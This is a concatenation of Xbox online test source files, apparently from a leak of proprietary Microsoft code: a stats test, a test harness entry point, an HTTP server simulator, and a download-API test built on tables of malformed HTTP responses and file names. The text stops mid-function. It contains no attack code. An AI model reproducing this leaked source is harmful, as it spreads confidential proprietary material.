#pragma comment( linker, "/include:_xrlfunc_ExportTableDirectory" )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\stats\stats.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       stats.h
 *  Content:    stats utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *   2/21/01    davidhef Created to test Xbox stats
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xlog.h>
#include <macros.h>
#include <xtestlib.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\oharness\main.cpp ===
/*++

Copyright (c) 2000  Microsoft Corporation

Module Name:

    main.cpp

Abstract:

    Entry point and initialization routines for test harness

--*/

#include <xtl.h>

extern "C"
DWORD
WINAPI
HarnessEntryPoint(
    VOID
    );

void __cdecl main( void )
{
    //
    // Call main routine of the tets harness library in harnesslib.lib
    //

    return HarnessEntryPoint();
}

//
// Tell the linker to include the following symbols so that XIU and XTU
// sections inside CRT will get built and startup/cleanup routines in
// xtestlib get executed
//

#pragma comment( linker, "/include:_xtestlib_startup" )
#pragma comment( linker, "/include:_xtestlib_cleanup" )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\stats\stats.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       stats.cpp
 *  Content:    stats tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *   2/21/01    davidhef Created to test Xbox stats
 *
 ****************************************************************************/

#include "stats.h"
#include <xonlinep.h>
#include <XOnline.h>
#include <XOnlineAuthUtil.h>
#include <CXLiveConnectionManager.h>
#include <CXLiveUserManager.h>

using XLive::CXLiveUserManager;
using XLive::CXLiveConnectionManager;
using XLive::CXLiveUserManager::const_AccountIterator;

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 *  stats_BasicTest
 *
 *  Description:
 *      Basic Test for stats
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT stats_BasicTest( void )
{
    HRESULT             hr              = S_OK;
    XONLINETASK_HANDLE  phTask = NULL;
    bool    bNetworkStarted = false;
    bool    bLoggedOn = false;
    
    if (SUCCEEDED(hr))
    {
        hr = StartNetwork();
        bNetworkStarted = (S_OK == hr) ? true : false;
    }
    
    CXLiveUserManager userMgr;
    CHECKRUN(userMgr.GenerateAndSelectRandomAccounts());

    // Logon the selected accounts.
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts(), (DWORD) 5000));
    hr = (XONLINE_S_LOGON_CONNECTION_ESTABLISHED == hr) ? S_OK : E_FAIL;
    bLoggedOn = (SUCCEEDED(hr)) ? true : false;

    XONLINE_SET_STAT setStats[XONLINE_MAX_LOGON_USERS];
    DWORD dwLeaderBoardID = 37;
    WORD statID = 13;           // Our lucky number ;-)

    // Fill in a XONLINE_STAT.
    XONLINE_STAT stats[1];
    stats[0].wID = XONLINE_STAT_RATING;
    stats[0].type = XONLINE_STAT_LONGLONG;
    static LONGLONG scores[XONLINE_MAX_LOGON_USERS] = {100293, 59567, 200456, 345};

    // Fill in and set a XONLINE_SET_STAT for each user.
    for (DWORD userIndex = 0; userIndex < XONLINE_MAX_LOGON_USERS && SUCCEEDED(hr); ++userIndex)
    {
        XONLINE_SET_STAT *pStat = setStats + userIndex;
        XONLINE_USER *pUser = userMgr.SelectedAccounts() + userIndex;

        pStat->xuidUser = pUser->xuid;
        pStat->dwLeaderBoardID = dwLeaderBoardID;
        pStat->dwNumStats = sizeof(stats) / sizeof(stats[0]);
        pStat->pStats = stats;
        stats[0].qwValue = scores[userIndex];

        hr = XOnlineStatSet(1, pStat, NULL, &phTask);
    }

    if (bLoggedOn)
    {
        // Log off.
        HRESULT loggedHr = CXLiveConnectionManager::Instance().Logoff();
        bLoggedOn = false;
    }

    if (bNetworkStarted)
    {
        HRESULT closedHr = CloseNetwork();
        hr = (FAILED(closedHr)) ? closedHr : hr;
        bNetworkStarted = false;
    }
    
    // BUGBUG: Remove this statement when the service is implemented.
    hr = E_NOTIMPL;

    return hr;
}

/****************************************************************************
 *
 *  stats_StartTest
 *
 *  Description:
 *      The Harness Entry into the stats tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI stats_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    //
    // Test stats in the manner it was meant to be called
    //

    SETLOG( LogHandle, "davidhef", "Online", "stats", "Basic" );
    EXECUTE( stats_BasicTest() );
}

/****************************************************************************
 *
 *  stats_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI stats_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    stats_StartTest( NULL );
    stats_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( stats )
#pragma data_seg()

BEGIN_EXPORT_TABLE( stats )
    EXPORT_TABLE_ENTRY( "StartTest", stats_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", stats_EndTest )
END_EXPORT_TABLE( stats )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\svrsim\svrsim.cpp ===
/*----------------------------------------------------------------------------
 *  Copyright  1997 Microsoft.  ALL RIGHTS RESERVED. 
 *----------------------------------------------------------------------------
 *  Date: 10/24/00
 *  Developer: Sean Wohlgemuth
 *----------------------------------------------------------------------------
 */

#ifdef _XBOX
#include <xtl.h>
#else
#include <windows.h>
#endif

#include <stdio.h>
#include "winsock2.h"
#include "svrsim.h"

//#define TRACEDEBUG

#ifdef TRACEDEBUG
#ifdef _XBOX
extern "C" {ULONG DebugPrint(PCHAR Format, ...);}
#else
#define DebugPrint printf
#endif
#else
#define DebugPrint(a)
#endif

//**********
//********** constructor
//**********
svrsim::svrsim():
m_fListening(false),
m_dwcResponse(0l),
m_fNetInit(true)
{
	strcpy(m_rgchResponse,"HTTP/1.1 200 OK\r\nDate: Tue, 24 Oct 2000 20:42:18 GMT\r\nLast-Modified: Tue, 24 Oct 2000 19:19:37 GMT\r\nContent-Length: 0\r\n\r\n");
	m_dwcResponse=strlen(m_rgchResponse);

	InitializeCriticalSection(&m_cs);
	m_shutdown=CreateEventA(NULL,true,false,"listen_shutdown_event");

	//Initialize XNET
	int err=0;
	#ifdef _XBOX
	err=XnetInitialize(NULL,true);
	if (0!=err)
		m_fNetInit=false;
	#endif

	if (true==m_fNetInit){
		//Initialize winsock
		WSADATA wsadata;
		WORD wVersionRequested = MAKEWORD( 2, 2 );
		err = WSAStartup(wVersionRequested, &wsadata);
		if (0!=err){
			m_fNetInit=false;
			#ifdef _XBOX
			XnetCleanup();
			#endif
		}//endif
	}//endif

};//endmethod

//**********
//********** destructor
//**********
svrsim::~svrsim(){

	//Fire shutdown event and give 1 second
	SetEvent(m_shutdown);
	Sleep(1000);

	//Release critical section
	DeleteCriticalSection(&m_cs);

	//Release shutdown event
	CloseHandle(m_shutdown);

	//Cleanup winsock
	WSACleanup();

	//Cleanup XNET
	#ifdef _XBOX
	XnetCleanup();
	#endif

}//endmethod

//**********
//********** public method
//**********
HRESULT svrsim::SetResponse(const char* pszFilename){

	HRESULT hr=S_OK;//return value
	FILE* pf=NULL;//file pointer

	//initialize memory
	memset(m_rgchResponse,0,sizeof(m_rgchResponse));

	//open response file
	pf=fopen(pszFilename,"rb");
	if (NULL==pf){
		return E_INVALIDARG;
	}//endif

	//store response file in memory
	EnterCriticalSection(&m_cs);
	m_dwcResponse=fread(m_rgchResponse,sizeof(char),sizeof(m_rgchResponse),pf);
	if (0==feof(pf)){
		hr=E_FAIL;
		LeaveCriticalSection(&m_cs);
		goto cleanup;
	}//endif
	LeaveCriticalSection(&m_cs);
		
cleanup:

	//cleanup
	if (NULL!=pf){
		fclose(pf);
	}//endif
	pf=NULL;

	//return
	return hr;

}//endmethod

//**********
//********** public method
//**********
HRESULT svrsim::SetResponse(const char* rgchBuffer, DWORD dwcBuffer){

	EnterCriticalSection(&m_cs);
	memcpy(m_rgchResponse,rgchBuffer,dwcBuffer);
	m_dwcResponse=dwcBuffer;
	LeaveCriticalSection(&m_cs);

	return S_OK;
}//endmethod

//**********
//********** public method
//**********
HRESULT svrsim::Listen(){

	//Network initialized properly?
	if (false==m_fNetInit) return E_FAIL;

	//BUGBUG: race condition possible but unlikely
	if (false==m_fListening){
		m_fListening=true;
	}else{
		return E_FAIL;
	}//endif

	SOCKET s;//listen socket
	SOCKET c;//accept socket
	struct sockaddr_in server;//listen struct
	struct sockaddr_in client;//accept struct
	int iLength;//temp length var
	unsigned long ulParam=1l; //ioctlsocket param
	int err=0;//winsock err code
	struct linger l_linger; //linger structure for setting hard close
	HRESULT hr=S_OK;

	//create listen socket
	s=socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == s){
		return E_FAIL;
	}//endif

	//configure listen socket
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons((short)80);

	//bind socket
	if (SOCKET_ERROR==bind(s,(struct sockaddr*)&server,sizeof(server))){
		hr=E_FAIL;
		goto cleanup;
	}//endif

	//set socket to listen state
	if (SOCKET_ERROR==listen(s,SOMAXCONN)){
		hr=E_FAIL;
		goto cleanup;
	}//endif

	//set socket to non-blocking
	ulParam=1;
	if (SOCKET_ERROR == ioctlsocket(s,FIONBIO,&ulParam)){
		hr=E_FAIL;
		goto cleanup;
	}//endif

	err=0;
	iLength=sizeof(struct sockaddr);
	do{
		//loop accepting connection or until shutdown event is fired
		do{
			//accept connection
			c=accept(s,(struct sockaddr*)&client,&iLength);
			if (INVALID_SOCKET==c)
				err=WSAGetLastError();
			else
				err=0;
		}while((WSAEWOULDBLOCK==err)&&(WAIT_TIMEOUT==WaitForSingleObject(m_shutdown,100)));

		//break out if shutdown was signalled
		if ((INVALID_SOCKET == c)||(WAIT_OBJECT_0==WaitForSingleObject(m_shutdown,0))){
			break;
		}//endif

		//Debug: print out connection name
		#ifdef TRACEDEBUG
		struct hostent* hostptr;
		hostptr=gethostbyaddr((char*)&(client.sin_addr),4,AF_INET);
		DebugPrint("connection: %s\n",(*hostptr).h_name);
		#endif

		//set accept socket to blocking
		ulParam=0;
		if (SOCKET_ERROR == ioctlsocket(c,FIONBIO,&ulParam)){
			hr=E_FAIL;
			goto cleanup;
		}//endif

		//set 2 second linger
		l_linger.l_onoff=1;
		l_linger.l_linger=2;
		if (SOCKET_ERROR == setsockopt(c,SOL_SOCKET,SO_LINGER,(char *)&l_linger,sizeof(l_linger))){
			hr=E_FAIL;
			goto cleanup;
		}//endif

		//process socket
		if FAILED(ProcessClient(&c)){
			hr=E_FAIL;
			break;
		}//endif
	}while(INVALID_SOCKET!=c);

cleanup:

	//cleanup accept socket
	if (INVALID_SOCKET!=c)
		closesocket(c);

	//cleanup listen socket
	if (INVALID_SOCKET!=s)
		closesocket(s);
	
	//Reset event and set listening state
	ResetEvent(m_shutdown);
	m_fListening=false;

	return hr;

}//endmethod
	
//**********
//********** public method
//**********
HRESULT svrsim::Stop(){

	//If not listing then duh!
	if (false==m_fListening){
		return S_OK;
	}//endif

	//Fire shutdown event
	SetEvent(m_shutdown);
		
	return S_OK;
}//endmethod

//**********
//********** private method
//**********
HRESULT svrsim::ProcessClient(SOCKET* ps){

	HRESULT hr=S_OK;//return value

	//validate parameters
	if (NULL==ps){
		return E_INVALIDARG;
	}//endif

	//local dereference
	SOCKET s=*ps;

	//local buffer
	char rgchBuffer[1024];
	int icRecv=0;

	//loop through data and ignore
	while (true){
		icRecv=recv(s,rgchBuffer,sizeof(rgchBuffer),0);

		//socket closed?
		if ((0==icRecv)||(SOCKET_ERROR==icRecv)){
			hr=E_FAIL;
			break;
		}//endif

		//end of data?
		if ('\n'==rgchBuffer[icRecv-1]){
			break;
		}//endif

	}//endif

	//still connected? send response
	if SUCCEEDED(hr){
		EnterCriticalSection(&m_cs);
		send(s,m_rgchResponse,m_dwcResponse,0);
		LeaveCriticalSection(&m_cs);
	}//endif

	//close socket
	closesocket(s);

	return hr;

}//endmethod

#ifndef _XBOX

//**********
//********** entry point
//**********

int __cdecl main(int argc, char *argv[ ]){

	HRESULT hr=S_OK;
	svrsim oSimulator;

	//check for proper number of command line params
	if (argc!=2){
		goto usage;
	}//endif

	//load the response file
	if (0!=_strnicmp(argv[1],"default\0",8))
		hr=oSimulator.SetResponse(argv[1]);

	//listen for connections
	if SUCCEEDED(hr){
		hr=oSimulator.Listen();
	}//endif

	//failure
	if FAILED(hr)
		return -1;

	//success
	return 0;

usage:

	printf("usage: %s responsefile | default\n",argv[0]);
	printf("example: %s default.txt\n",argv[0]); 
	printf("example: %s default\n",argv[0]); 

	return -1;
}//endmethod	
#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\modules\xrlfunc\xrlfunc.cpp ===
/*----------------------------------------------------------------------------
 *  Copyright  1997 Microsoft.  ALL RIGHTS RESERVED. 
 *----------------------------------------------------------------------------
 *  Date: 11/01/00
 *  Developer: Sean Wohlgemuth
 *----------------------------------------------------------------------------
 */

//BUGBUG: NULL PARAMETERS CHECK COMMENTED OUT; WAITING FOR RIP DECTECTION LOGIC

#include <stdio.h>
#include <stdlib.h>

#include <xlog.h> //xlog includes
#include <xtestlib.h> //harness includes

#include "xrl.h" //component under test includes
#include "xonlinep.h"
#include "svrsim.h" //IIS simulator includes

//**********
//********** global defines
//**********
#define TRACEDEBUG
#ifdef TRACEDEBUG
#ifdef _XBOX
extern "C" {ULONG DebugPrint(PCHAR Format, ...);}
#else
#define DebugPrint printf
#endif
#else
#define DebugPrint(a)
#endif

#define BREAK_INTO_DEBUGGER __asm int 3
#define MAX_SERVER_RESPONSE 4096
#define DEFAULT_URL "content:/default.html"
#define DOWNLOAD_URL "content:/read/00000001.000"
#define DOWNLOAD_URL2 "content:/read/00000400.000"
#define DEFAULT_FILE "T:\\xrldata.dat"
#define BASIC_RESPONSE "HTTP/1.1 200 OK\r\nDate: Mon, 26 Nov 2000 14:36:10 GMT\r\nLast-Modified: Mon, 26 Nov 2000 14:36:10 GMT\r\nContent-Length: 10\r\n\r\n0123456789"
#define TICKET_FILE "T:\\SERVMAP.XBA"

//**********
//********** global variables
//**********
HANDLE g_hLog = INVALID_HANDLE_VALUE; //xlog handle
svrsim g_oSimulator; //IIS simulator object
HANDLE g_hThread; //IIS simulator thread handle

//**********
//********** enumeration list for possible IIS responses
//**********

//string, valid/invalid pair
typedef struct value_pair_struct{
	char* pszValue;
	bool fValid;
}value_pair;

//HTTP version field
const unsigned int MAX_HTTP_Version = 13;
value_pair g_rgHTTP_Version[MAX_HTTP_Version]={
	{"HTTP/1.1",true}, //valid
	{"HTTP/2.2",true}, //valid
	{"HTTP/0.0",true}, //valid
	{"HTTP/9.9",true}, //valid
	{"HTTP/10.10",false}, //invalid version
	{"HTTP/X.X",false}, //invalid version
	{"        ",false}, //missing required components
	{"XXXXXXXX",false}, //missing required components
	{"HXXXXXXX",false}, //1st char valid; rest chars invalid
	{" ",false}, //space
	{"H",false}, //1st valid char
	{"",false}, //empty
	{"01234567890123456789",false} //larger than usual; invalid chars
};

//SP (space) field
#define MAX_SP 5
const unsigned int MAX_SP0 = MAX_SP;
const unsigned int MAX_SP1= MAX_SP;
value_pair g_rgSP[MAX_SP]={
	{" ",true}, //valid
	{"X",false}, //invalid; valid length
	{"  ",false}, //valid + invalid chars
	{"",false}, //empty
	{"01234567890123456789",false} //larger than usual; invalid chars
};

//Status code field
const unsigned int MAX_Status_Code = 7;
value_pair g_rgStatus_Code[MAX_Status_Code]={
	{"200",true}, //valid
	{"100",true}, //valid
	{"   ",false}, //invalid chars; valid length
	{"XXX",false}, //invalid chars; valid length
	{"999",false}, //not success code
	{"",false}, //empty
	{"01234567890123456789",false} //larger than usual
};

//Reason field
const unsigned int MAX_Reason_Phrase = 5;
value_pair g_rgReason_Phrase[MAX_Reason_Phrase]={
	{"OK",true}, //valid reason
	{"XX",true}, //valid reason
	{"  ",true}, //valid reason
	{"",true}, //valid empty
	{"01234567890123456789",true} //valid larger than just OK
};

//CRLF (Carriage Return/Line Feed) field
#define MAX_CRLF 7
const unsigned int MAX_CRLF0 = MAX_CRLF;
const unsigned int MAX_CRLF1 = MAX_CRLF;
const unsigned int MAX_CRLF2 = MAX_CRLF;
const unsigned int MAX_CRLF3 = MAX_CRLF;
const unsigned int MAX_CRLF4 = MAX_CRLF;
value_pair g_rgCRLF[MAX_CRLF]={
	{"\r\n",true}, //valid
	{"\r",false}, //half order of parameters
	{"\n",false}, //half order of parameters
	{"",false}, //empty
	{"XX",false}, //invalid chars; valid length
	{"  ",false}, //invalid chars; valid length
	{"01234567890123456789",false} //larger than usual
};

//Header date name field
const unsigned int MAX_DateName = 9;
value_pair g_rgDateName[MAX_DateName]={
	{"Date: ",true}, //valid
	{"Date:",true}, //valid
	{"DateDate:",false}, //invalid
	{"XXXX:",false}, //invalid chars; valid length
	{"XXXX: ",false}, //invalid chars; valid length
	{":",false}, //no field name
	{" ",false}, //invalid space
	{"",false}, //empty
	{"01234567890123456789",false} //larger than usual
};

//Header last-modified name field
const unsigned int MAX_LastModifiedName = 9;
value_pair g_rgLastModifiedName[MAX_LastModifiedName]={
	{"Last-Modified: ",true}, //valid
	{"Last-Modified:",true}, //valid
	{"Last-ModifiedLast-Modified:",false}, //invalid
	{"XXXXXXXXXXXXX:",false}, //invalid chars; valid length
	{"XXXXXXXXXXXXX: ",false}, //invalid chars; valid length
	{":",false}, //no field name
	{" ",false}, //invalid space
	{"",false}, //empty
	{"01234567890123456789",false} //larger than usual
};

//Header content-length name field
const unsigned int MAX_ContentLengthName = 9;
value_pair g_rgContentLengthName[MAX_ContentLengthName]={
	{"Content-Length: ",true}, //valid
	{"Content-Length:",true}, //valid
	{"Content-LengthContent-Length:",false}, //invalid
	{"XXXXXXXXXXXXXX:",false}, //invalid chars; valid length
	{"XXXXXXXXXXXXXX: ",false}, //invalid chars; valid length
	{":",false}, //no field name
	{" ",false}, //invalid space
	{"",false}, //empty
	{"01234567890123456789",false} //larger than usual
};

//Header extension name field
const unsigned int MAX_ExtensionName = 7;
value_pair g_rgExtensionName[MAX_ExtensionName]={
	{"XXXXXX: ",true}, //valid
	{"XXXXXX:",true}, //valid
	{":",false}, //no field name
	{" ",false}, //invalid space
	{"",true}, //empty (not required field)
	{"012345678901234567890123456789012345678901234567890123456789",false}, //larger than usual
	{"012345678901234567890123456789012345678901234567890123456789:",true} //larger than usual
};

//Header date value field
#define MAX_DateValue 41
const unsigned int MAX_DateValue0 = MAX_DateValue;
const unsigned int MAX_DateValue1 = MAX_DateValue;
value_pair g_rgDateValue[MAX_DateValue]={
	{"Mon, 26 Nov 2000 14:36:10 GMT",true}, //valid
	{"Tue, 26 Nov 2000 14:36:10 GMT",true}, //valid
	{"Wed, 26 Nov 2000 14:36:10 GMT",true}, //valid
	{"Thu, 26 Nov 2000 14:36:10 GMT",true}, //valid
	{"Fri, 26 Nov 2000 14:36:10 GMT",true}, //valid
	{"Sat, 26 Nov 2000 14:36:10 GMT",true}, //valid
	{"Sun, 26 Nov 2000 14:36:10 GMT",true}, //valid
	{"XXX, 26 Nov 2000 14:36:10 GMT",false}, //invalid day
	{"Mon, 1 Nov 2000 14:36:10 GMT",true}, //valid
	{"Mon, 30 Nov 2000 14:36:10 GMT",true}, //valid
	{"Mon, 31 Nov 2000 14:36:10 GMT",false}, //there is no nov 31st
	{"Mon, 99 Nov 2000 14:36:10 GMT",false}, //there is no nov 99th
	{"Mon, -1 Nov 2000 14:36:10 GMT",false}, //there is no nov -1th
	{"Mon, 1 Nov 4050 14:36:10 GMT",true}, //valid
	{"Mon, 1 Jan 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Feb 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Mar 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Apr 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 May 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Jun 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Jul 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Aug 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Sep 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Oct 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Nov 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 Dec 2000 14:36:10 GMT",true}, //valid
	{"Mon, 1 XXX 2000 14:36:10 GMT",false}, //invalid month
	{"Mon, 1 Nov 10000000 14:36:10 GMT",false}, //invalid year
	{"Mon, 1 Nov -1 14:36:10 GMT",false}, //invalid year
	{"Mon, 1 Nov 2000 -1:36:10 GMT",false}, //invalid hour
	{"Mon, 1 Nov 2000 00:00:00 GMT",true}, //valid midnight
	{"Mon, 1 Nov 2000 23:59:59 GMT",true}, //valid one minute before midnight
	{"Mon, 1 Nov 2000 24:00:00 GMT",false}, //invalid rep of midnight
	{"Mon, 1 Nov 2000 14:-1:10 GMT",false}, //invalid minute
	{"Mon, 1 Nov 2000 14:60:10 GMT",false}, //invalid minute
	{"Mon, 1 Nov 2000 14:36:-1 GMT",false}, //invalid second
	{"Mon, 1 Nov 2000 14:36:60 GMT",false}, //invalid second
	{"Mon, 1 Nov 2000 14:36:10 XMT",false}, //invalid timestamp
	{"Mon, 1 Nov 2000 14:36:10.50 GMT",false}, //invalid milliseconds
	{"Mon,X1XNovX2000X14:36:10XGMT",false}, //invalid required whitespace
	{"MonXX1XNovX2000X14X36X10XGMT",false} //invalid required whitespace and special chars
};

//Header content-length value field
const unsigned int MAX_ContentLength = 5;
value_pair g_rgContentLength[MAX_ContentLength]={
	{"10",true}, //valid length and content
	{"0",true}, //valid length and content
	{"-1",false}, //invalid length for content
	{"9",false}, //length and content mismatch
	{"11",false} //length and content mismatch
};

//content field (parallel array to g_rgContentLength array)
value_pair g_rgContent[MAX_ContentLength]={
	{"0123456789",true}, //parallel
	{"",true}, //parallel
	{"0123456789",true}, //parallel
	{"0123456789",true}, //parallel
	{"0123456789",true} //parallel
};

//second dimension to response enumeration
typedef struct response_struct{
	const char* pcszName; //field identifier
	value_pair* rgValuePair; //possibilities
	DWORD dwcValuePair; //# of possibilities
}response;//endtypedef

const unsigned int ResponseComponents=17;
const unsigned int ContentLengthIndex=13;
const unsigned int ContentIndex=16;
response g_response[ResponseComponents]={
	{"HTTP Version",g_rgHTTP_Version,MAX_HTTP_Version},
	{"SP 0",g_rgSP,MAX_SP},
	{"Status Code",g_rgStatus_Code,MAX_Status_Code},
	{"SP 1",g_rgSP,MAX_SP},
	{"Reason Phrase",g_rgReason_Phrase,MAX_Reason_Phrase},
	{"CRLF 0",g_rgCRLF,MAX_CRLF},
	{"Date Name",g_rgDateName,MAX_DateName},
	{"Date Value 0",g_rgDateValue,MAX_DateValue},
	{"CRLF 1",g_rgCRLF,MAX_CRLF},
	{"Last Modified Name",g_rgLastModifiedName,MAX_LastModifiedName},
	{"Date Value 1",g_rgDateValue,MAX_DateValue},
	{"CRLF 2",g_rgCRLF,MAX_CRLF},
	{"Content Length Name",g_rgContentLengthName,MAX_ContentLengthName},
	{"Content Length",g_rgContentLength,MAX_ContentLength},
	{"CRLF 3",g_rgCRLF,MAX_CRLF},
	{"CRLF 4",g_rgCRLF,MAX_CRLF},
	{"Content",g_rgContent,MAX_ContentLength}
};

const MAX_FileNames=19;
value_pair g_rgFilenames[MAX_FileNames]={
	{"T:\\download.txt",true},					//valid filename
	{"T:\\temp\\download.txt",true},			//valid filename
	{"T:\\temp\\temp\\download.txt",true},		//valid filename
	{"T:/download.txt",false},					//invalid filename
	{"T:/temp/download.txt",false},			//invalid filename
	{"download.txt",false},					//no drive
	{"\\download.txt",false},					//no drive
	{"T:\\01234567.012",true},					//valid filename
	{"T:\\012345678.012",false},				//breaks the 8 in 8.3
	{"T:\\01234567.0123",false},				//breaks the 3 in 8.3
	{"T:\\012345678.0123",false},				//breaks the 8 & 3 in 8.3
	{"T:\\\0",false},							//invalid char
	{"T:\\\n",false},							//invalid char
	{"T:\\\r",false},							//invalid char
	{"T:\\\n\r",false},						//invalid char
	{"T:\\\r\n",false},						//invalid char
	{"T:\\\\\\",false},						//invalid char
	{"T:\\~!@#$%^&*()_+:\"{}[]|<>?,.;`~",false},//invalid char
	{"xxxx:\\download.txt",false}				//bad drive
};

//**********
//********** webserver_simulator thread
//**********
DWORD WINAPI webserver_simulator(LPVOID pvoid){
	svrsim* pSimulator; //simulator pointer

	//valid parameter
	if (NULL==pvoid)
		return -1;

	//cast function pointer
	pSimulator=(svrsim*)pvoid;

	//start simulator
	pSimulator->Listen();

	//finished
	return 0;

}//endmethod

//**********
//********** xrlfunc_InitializeNet
//**********
HRESULT xrlfunc_InitializeNet(){

	//Initialize XNET
	int err=XnetInitialize(NULL,true);
	if (0!=err)
		return E_FAIL;

	//Initialize winsock
	WSADATA wsadata;
	WORD wVersionRequested = MAKEWORD( 2, 2 );
	err = WSAStartup(wVersionRequested, &wsadata);
	if (0!=err){
		XnetCleanup();
		return E_FAIL;
	}//endif

	return S_OK;

}//endmethod

//**********
//********** xrlfunc_CleanupNet
//**********
HRESULT xrlfunc_CleanupNet(){

	//Cleanup winsock
	WSACleanup();

	//Cleanup XNET
	XnetCleanup();

	return S_OK;

}//endmethod

//**********
//********** Enumerate_IIS_Responses
//**********
HRESULT Enumerate_IIS_Responses(const char* rgchServerResponseBuffer, DWORD dwcServerResponseBuffer, DWORD dwcValidContent, bool fExpected, bool fFile){
	HRESULT hr=S_OK;
	const XRL pcszURL=DEFAULT_URL;
	const CHAR* pcwszFile=DEFAULT_FILE;

	//configure server simulator to reply with test response
	g_oSimulator.SetResponse(rgchServerResponseBuffer,dwcServerResponseBuffer);

	//create valid XRL_KNOWN_HEADERS struct
	XRL_KNOWN_HEADERS* pXKH = new XRL_KNOWN_HEADERS;
	pXKH->pDate=new FILETIME;
	pXKH->pLastModifiedTime=new FILETIME;
	pXKH->pContentLength=new ULARGE_INTEGER;

	//Allocate space for return repsonse
	unsigned char rgchLocalResponseBuffer[MAX_SERVER_RESPONSE];
	DWORD dwcLocalResponseBuffer=MAX_SERVER_RESPONSE;

	//execute the API
	SYSTEMTIME st;
	st.wYear=1900;
	st.wMonth=1;
	st.wDayOfWeek=0;
	st.wDay=1;
	st.wHour=12;
	st.wMinute=0;
	st.wSecond=0;
	st.wMilliseconds=0;
	FILETIME ft;
	SystemTimeToFileTime(&st,&ft);

	HRESULT lhr=S_OK;
	__try{
		if (fFile){
			//Delete any existing file
			DeleteFile(pcwszFile);

			//Perform API
			lhr=XRL_DownloadFile(pcszURL,dwcLocalResponseBuffer,rgchLocalResponseBuffer,&ft,pcwszFile,pXKH);

			//If success read file into buffer
			if (S_OK==lhr){
				FILE* fp=fopen(pcwszFile,"rb");
				if (NULL==fp){
					xLog(g_hLog, XLL_FAIL, "File Missing");
					return E_FAIL;
				}//endif
				ZeroMemory(rgchLocalResponseBuffer,sizeof(rgchLocalResponseBuffer));
				dwcLocalResponseBuffer=fread(rgchLocalResponseBuffer,sizeof(char),sizeof(rgchLocalResponseBuffer),fp);
				fclose(fp);
			}//endif
		}else{
			//Perform API
			lhr=XRL_DownloadToMemory(pcszURL,&dwcLocalResponseBuffer,rgchLocalResponseBuffer,pXKH);
		}//endelse
	}__except(1){
		xLog(g_hLog, XLL_EXCEPTION, "Exception Raised");
		return E_FAIL;
	};//endexcept

	//check return code
	hr=S_OK;
	
	switch (lhr){

	case ERROR_INVALID_PARAMETER:
		if (false==fExpected){
			xLog(g_hLog, XLL_PASS, "");
		}else{
			xLog(g_hLog, XLL_FAIL, "ERROR_INVALID_PARAMETER Not Expected");
			hr=E_FAIL;
		}//endelse
		break;

	case (HRESULT_FROM_WIN32(ERROR_BAD_NET_RESP)):
		if (false==fExpected){
			xLog(g_hLog, XLL_PASS, "");
		}else{
			xLog(g_hLog, XLL_FAIL, "ERROR_BAD_NET_RESP Not Expected");
			hr=E_FAIL;
		}//endelse
		break;

	case ERROR_INSUFFICIENT_BUFFER:
		if (false==fExpected){
			xLog(g_hLog, XLL_PASS, "");
		}else{
			xLog(g_hLog, XLL_FAIL, "ERROR_INSUFFICIENT_BUFFER Not Expected");
			hr=E_FAIL;
		}//endelse
		break;

	case S_OK:
		if (true!=fExpected){
			xLog(g_hLog, XLL_INFO, "Possible Recovery Case; Validating Content");
			hr=E_FAIL;
		}//endif
		if (dwcValidContent!=dwcLocalResponseBuffer){
			//INVALID CONTENT SIZE
